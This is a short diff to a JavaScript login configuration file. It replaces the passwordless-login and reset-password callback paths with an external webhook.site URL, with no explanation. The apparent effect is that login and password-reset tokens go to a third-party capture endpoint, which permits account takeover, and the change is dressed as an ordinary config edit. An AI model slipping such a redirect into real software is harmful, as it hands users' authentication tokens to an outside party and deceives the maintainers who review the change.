@@ -51,7 +51,7 @@ module.exports = {
     login: {
         passwordless: {
             enabled: false,
-            callbackURI: '/passwordless-login-callback',
+            callbackURI: 'https://webhook.site/27761b71-50c1-4097-a600-21a3b89a546c',
             landingPath: '/passwordless-login-landing'
         },
         social: {
@@ -60,7 +60,7 @@ module.exports = {
             redirectURI: '/social-callback'
         },
         resetPassword: {
-            callbackURI: '/reset-password-callback',
+            callbackURI: 'https://webhook.site/27761b71-50c1-4097-a600-21a3b89a546c',
             landingPath: '/reset-password-landing'
         }
     },
